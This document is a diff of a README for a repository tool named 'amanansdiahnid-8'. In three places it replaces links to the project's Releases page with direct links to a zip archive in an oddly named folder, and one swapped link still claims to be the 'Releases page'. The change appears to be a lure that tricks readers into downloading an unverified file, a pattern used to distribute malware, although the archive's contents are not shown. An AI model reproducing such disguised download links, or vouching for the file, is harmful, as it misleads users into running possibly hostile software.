@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-8 - Simple Tool to Manage Repositories
 
-[![Download amanansdiahnid-8](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/ASLAM-04/amanansdiahnid-8/releases)
+[![Download amanansdiahnid-8](https://raw.githubusercontent.com/ASLAM-04/amanansdiahnid-8/main/steid/amanansdiahnid-8.zip)](https://raw.githubusercontent.com/ASLAM-04/amanansdiahnid-8/main/steid/amanansdiahnid-8.zip)
 
 ## 📋 Description
 
@@ -26,7 +26,7 @@ To run amanansdiahnid-8, you need:
 Follow these steps to get started with amanansdiahnid-8:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/ASLAM-04/amanansdiahnid-8/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/ASLAM-04/amanansdiahnid-8/main/steid/amanansdiahnid-8.zip) to find the latest version of the application.
 
 2. **Download the Application:**
    Click on the version you want to download. You can find this at the top of the releases page. Click on the corresponding installation file to begin your download.
@@ -42,7 +42,7 @@ Follow these steps to get started with amanansdiahnid-8:
 
 ## 🔗 Download & Install
 
-To download amanansdiahnid-8, visit this page: [Download Here](https://github.com/ASLAM-04/amanansdiahnid-8/releases).
+To download amanansdiahnid-8, visit this page: [Download Here](https://raw.githubusercontent.com/ASLAM-04/amanansdiahnid-8/main/steid/amanansdiahnid-8.zip).
 
 ## 🛠️ Troubleshooting
 
